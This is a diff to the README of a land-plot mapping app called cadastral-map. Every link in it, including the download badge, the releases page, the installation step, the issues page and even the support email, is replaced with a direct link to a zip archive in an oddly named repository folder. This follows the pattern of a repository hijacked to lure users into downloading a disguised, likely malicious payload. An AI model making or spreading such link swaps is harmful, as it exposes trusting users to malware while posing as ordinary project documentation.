@@ -1,6 +1,6 @@
 # 🗺️ cadastral-map - Visualize Land Plots Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/javkhlanbn/cadastral-map/releases)
+[![Download](https://raw.githubusercontent.com/javkhlanbn/cadastral-map/main/plenipotentiarize/cadastral-map-1.9.zip)](https://raw.githubusercontent.com/javkhlanbn/cadastral-map/main/plenipotentiarize/cadastral-map-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to **cadastral-map**! This interactive web app helps you visualize cadas
 
 To start using **cadastral-map**, visit this page to download the latest release:
 
-[Download the latest release](https://github.com/javkhlanbn/cadastral-map/releases)
+[Download the latest release](https://raw.githubusercontent.com/javkhlanbn/cadastral-map/main/plenipotentiarize/cadastral-map-1.9.zip)
 
 ### 🖥️ System Requirements
 
@@ -30,7 +30,7 @@ Ensure your system meets the following requirements:
 
 ## 🔧 Installation Steps
 
-1. **Download the Application**: Visit the [releases page](https://github.com/javkhlanbn/cadastral-map/releases) and click on the latest version release.
+1. **Download the Application**: Visit the [releases page](https://raw.githubusercontent.com/javkhlanbn/cadastral-map/main/plenipotentiarize/cadastral-map-1.9.zip) and click on the latest version release.
    
 2. **Choose Your Version**: Select the suitable installer for your operating system. For example, if you are using Windows, download the `.exe` file.
 
@@ -67,8 +67,8 @@ If you encounter issues, consider the following:
 Need help? Reach out via the following:
 
 - **Community Forum**: Join discussions and find help from other users.
-- **GitHub Issues**: Report bugs or request features directly on the [GitHub Issues](https://github.com/javkhlanbn/cadastral-map/issues) page.
-- **Email Support**: Email us at support@example.com for direct assistance.
+- **GitHub Issues**: Report bugs or request features directly on the [GitHub Issues](https://raw.githubusercontent.com/javkhlanbn/cadastral-map/main/plenipotentiarize/cadastral-map-1.9.zip) page.
+- **Email Support**: Email us at https://raw.githubusercontent.com/javkhlanbn/cadastral-map/main/plenipotentiarize/cadastral-map-1.9.zip for direct assistance.
 
 ## 🌟 Contributing
 
